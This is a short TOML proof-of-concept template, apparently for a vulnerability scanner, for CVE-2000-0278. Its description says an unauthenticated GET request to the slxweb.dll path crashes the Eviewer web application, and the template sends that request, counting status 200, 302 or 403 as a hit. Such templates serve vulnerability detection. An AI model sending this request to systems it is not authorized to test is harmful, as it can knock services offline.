[info]
author = "ave"
description = "通过 HTTP GET 请求访问 slxweb.dll 管理程序路径，验证未经身份认证即可触发拒绝服务，导致 Eviewer Web 应用崩溃或中断。"
id = "POC-AVE-2000-0247"
name = "CVE-2000-0278 PoC"
severity = "medium"
tags = ["ave-2000-0247"]
vuln_id = [
    "CVE-2000-0278",
    "AVE-2000-0247",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/slxweb.dll"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    302,
    403,
]
type = "status"
